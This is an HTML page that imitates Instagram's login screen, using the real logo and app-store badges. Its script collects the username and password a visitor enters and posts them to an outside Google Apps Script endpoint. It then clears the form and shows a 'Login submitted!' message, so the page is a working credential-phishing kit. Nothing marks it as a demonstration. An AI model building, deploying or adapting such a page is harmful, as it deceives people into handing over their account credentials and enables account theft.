<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        <link rel="stylesheet" href="style.css" />
        <link rel="icon" type="image/png" href="images/favicon.png" />
        <title>Instagram</title>
      </head>      
<body>
  <div class="main-container">
    <div class="image-container">
      <img src="images/insta.png" alt="Instagram visual" />
    </div>

    <div class="form-container">
      <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="insta-logo" />

        <input type="text" id="email" placeholder="Phone number, username, or email" />
        <input type="password" id="pass" placeholder="Password" />
        <button onclick="login()">Log In</button>

        <div class="divider">
          <div></div>
          <span>OR</span>
          <div></div>
        </div>

        <a href="#" class="fb-login">Log in with Facebook</a>
        <a href="#" class="forgot-password">Forgot password?</a>
      </div>

      <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
      </div>

      <div class="get-app">Get the app.</div>

      <div class="app-buttons">
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" />
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" />
      </div>
    </div>
  </div>

  <script>
    function login() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("pass").value;

      if (!email || !password) {
        alert("Please enter both fields");
        return;
      }

      const formData = new FormData();
      formData.append('email', email);
      formData.append('password', password);

      const scriptUrl = 'https://script.google.com/macros/s/AKfycbz4cLIxlXaPDpyJdpV7rnRKhepc3f1Rpt38vfKnYdUmVnmKDjmlRpvYkMkSLqldrA/exec';

      fetch(scriptUrl, {
        method: 'POST',
        body: formData,
        mode: 'no-cors'
      }).then(() => {
        alert("Login submitted!");
        document.getElementById("email").value = '';
        document.getElementById("pass").value = '';
      }).catch(err => {
        console.error("Error:", err);
        alert("Submission failed.");
      });
    }
  </script>
</body>
</html>
